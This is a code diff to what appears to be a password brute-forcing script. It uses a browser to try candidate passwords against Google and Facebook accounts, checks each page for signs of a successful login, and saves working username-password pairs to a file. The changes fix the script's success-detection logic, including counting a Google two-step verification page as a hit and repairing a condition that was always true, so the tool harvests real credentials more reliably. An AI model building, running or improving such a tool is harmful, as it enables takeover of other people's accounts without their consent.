@@ -370,7 +370,7 @@ def main():
                     driver.quit()
                     break
   
-                elif r"You're signed in" in response_ or   r"Recovery information" in response_:
+                elif r"You're signed in" in response_ or   r"Recovery information" in response_ or r'2-step verification' in response_:
                   print(f'{green}Correct password : {check_password}{plain}')
                   driver.quit()
                   save_passwords.write(f'{username_email} - {check_password} - Google - {time.time()}\n')
@@ -441,12 +441,12 @@ def main():
                     print(f'{red}Couldn\'t find the account {username_email}{plain}')
                     driver.quit()
                     break
-                  if "Check your notifications on  another device" in page_content:
+                  if "Check your notifications on  another device" in page_now:
                     print(f'{yellow}Correct password {check_password} [ might have 2 factor authentication {plain}]', flush = True)
                     driver.quit()
                     save_passwords.write(f'{username_email} - {check_password} - Facebook - {time.time()}\n')
                     break
-                  if  'Find friends' in page_content or 'authentication' in page_content or 'recovery information':
+                  if  'Find friends' in page_content or 'authentication' in page_content or 'recovery information' in page_content:
                     print(f'{yellow} {check_password} is the correct password{plain}')
                     driver.quit()
                     save_passwords.write(f'{username_email} - {check_password} - Facebook - {time.time()}\n')
